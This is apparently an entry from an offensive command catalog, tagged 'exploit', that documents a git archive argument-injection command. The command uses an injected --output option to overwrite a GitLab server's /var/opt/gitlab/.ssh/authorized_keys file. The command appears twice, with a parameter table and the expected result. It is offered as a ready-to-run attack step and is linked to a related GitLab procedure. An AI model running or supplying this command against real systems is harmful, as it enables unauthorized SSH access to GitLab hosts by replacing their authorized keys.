---
data: >-
  git --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID
  --output=/var/opt/gitlab/.ssh/authorized_keys
tags:
  - exploit
  - git
type: command
executor: bash
platforms:
  - Linux
id: 005b9a19-11c4-4837-a8fe-abb7815a21fe
created_at: '2025-12-11T03:47:39.979Z'
updated_at: '2025-12-11T03:47:39.979Z'
verified: false
validated: true
submitted: true
---
# git-archive-overwrite

## Command

```bash
git --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID --output=/var/opt/gitlab/.ssh/authorized_keys
```

## Description

Executes git archive but misinterprets the path as options, writing the archive to the specified output file instead of streaming it, enabling file overwrite.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--format` | Sets output format to tar | Yes |
| `--output` | Redirects output to the specified file path (injected) | Yes |
| `--prefix` | Sets prefix for files in archive | Yes |
| `--git-dir` | Specifies the repository directory | Yes |
| `COMMIT_ID` | The commit to archive | Yes |

## Examples

### Basic Usage

```bash
git --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID --output=/var/opt/gitlab/.ssh/authorized_keys
```

## Expected Output

Writes tar archive content to /var/opt/gitlab/.ssh/authorized_keys.

## Related

- [[procedures/Trigger-Git-Archive-Download-in-GitLab]]
